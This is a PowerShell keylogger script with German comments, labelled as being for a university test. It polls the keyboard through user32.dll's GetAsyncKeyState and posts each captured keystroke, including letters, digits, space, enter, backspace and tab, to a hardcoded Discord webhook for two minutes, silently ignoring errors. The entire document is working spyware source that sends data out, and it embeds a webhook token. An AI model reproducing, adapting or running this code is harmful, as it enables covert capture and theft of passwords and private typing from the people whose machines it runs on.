# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Virtual Key Codes
$VK_SPACE = 0x20     # Leerzeichen
$VK_RETURN = 0x0D    # Enter
$VK_BACK = 0x08      # Backspace
$VK_TAB = 0x09       # Tab
$VK_SHIFT = 0x10     # Shift
$VK_CAPITAL = 0x14   # Caps Lock

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }

    # Shift und Caps Lock Status prüfen
    $shift = [Keyboard]::GetAsyncKeyState($VK_SHIFT) -band 0x8000
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

    # Prüfe spezielle Tasten
    if ([Keyboard]::GetAsyncKeyState($VK_SPACE) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=" "}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        continue
    }
    if ([Keyboard]::GetAsyncKeyState($VK_RETURN) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="`n"}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        continue
    }
    if ([Keyboard]::GetAsyncKeyState($VK_BACK) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[BACK]"}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        continue
    }
    if ([Keyboard]::GetAsyncKeyState($VK_TAB) -eq -32767) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="`t"}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        continue
    }

    # Prüfe Buchstaben (A-Z)
    foreach ($vkey in 65..90) {
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            $char = [char]$vkey
            # Groß-/Kleinschreibung basierend auf Shift und Caps Lock
            if (!($shift -xor $caps)) {
                $char = $char.ToString().ToLower()
            }
            try {
                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$char}|ConvertTo-Json) -ContentType "application/json"

            } catch {}
        }
    }

    # Prüfe Zahlen (0-9)
    foreach ($vkey in 48..57) {
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            try {
                if ($shift) {
                    $shiftNums = @(')','!','@','#','$','%','^','&','*','(')
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$shiftNums[$vkey-48]}|ConvertTo-Json) -ContentType "application/json"
                } else {
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=[char]$vkey}|ConvertTo-Json) -ContentType "application/json"
                }
            } catch {}
        }
    }
    Start-Sleep -Milliseconds 1  # Kürzere Verzögerung für besseres Ansprechverhalten
}

# Logger-Ende an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}